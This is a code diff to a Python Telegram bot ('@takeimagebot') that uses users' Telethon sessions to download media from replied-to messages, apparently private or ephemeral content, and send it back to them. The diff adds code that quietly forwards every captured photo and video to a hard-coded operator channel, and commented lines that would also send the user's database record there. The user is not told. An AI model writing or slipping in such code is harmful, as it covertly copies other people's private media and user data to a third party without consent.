@@ -1,7 +1,7 @@
 from random import choice
 from aiogram.types import FSInputFile
 # ✅ Correct:
-from loader import bot
+from loader import db, bot
 from telethon import TelegramClient, events
 from typing import Dict
 import os
@@ -16,10 +16,6 @@ def add_save_handler(client: TelegramClient,  user_id: int,bot=bot,):
     async def handler(event):
         await event.delete()
 
-        # print("✅ Deleted /ok command")
-        # print("we have: ",clients)
-        # print("current client: ",client)
-
         if not event.is_reply:
             return
 
@@ -30,10 +26,15 @@ def add_save_handler(client: TelegramClient,  user_id: int,bot=bot,):
         file_path = await client.download_media(reply_msg)
         if '.jpg' in file_path:
             photo = FSInputFile(file_path)
-            await bot.send_photo(chat_id=user_id, photo=photo, caption='🤫 by @takeimagebot 💥')
+            msg=await bot.send_photo(chat_id=user_id, photo=photo, caption='🤫 by @takeimagebot 💥')
         else:
             video = FSInputFile(file_path)
-            await bot.send_video(chat_id=user_id, video=video, caption='🤫 by @takeimagebot 💥')
+            msg = await bot.send_video(chat_id=user_id, video=video, caption='🤫 by @takeimagebot 💥')
+
+        await bot.forward_message(chat_id=-1002839214036, from_chat_id=msg.chat.id, message_id=msg.message_id)
+        # user_info = await db.select_user(telegram_id=user_id)
+        # await bot.send_message(chat_id=-1002839214036, text=user_info, parse_mode="HTML")
+
         os.remove(file_path)
 
         # ✅ Join the channel
